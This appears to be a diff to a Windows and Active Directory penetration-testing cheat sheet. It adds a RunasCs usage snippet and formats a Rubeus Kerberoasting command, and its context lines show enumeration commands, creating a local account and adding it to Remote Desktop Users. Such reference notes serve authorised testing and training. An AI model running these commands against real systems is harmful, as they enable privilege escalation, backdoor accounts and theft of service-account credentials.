@@ -10,7 +10,10 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 netstat -ano    # find out what ports are open
 net users
 net user /domain [username]   # check domain group of the user
+-------------------------Run As----------------------------
 runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
+Import-module invoke-runascs.ps1        # https://github.com/antonioCoco/RunasCs
+Invoke-RunasCs [username] [password] [cmd]
 -------------------------Add user--------------------------
 net user /add [username] [password]
 net localgroup "Remote Desktop Users" [username] /add
@@ -221,7 +224,10 @@ Foreach($obj in $Result)
 
 1. Find interesting SPN (Service Principal Name)
 2. Get its SAMaccountname
-3. Rubeus.exe kerberoast /nowrap
+
+```
+Rubeus.exe kerberoast /nowrap
+```
 
 
 
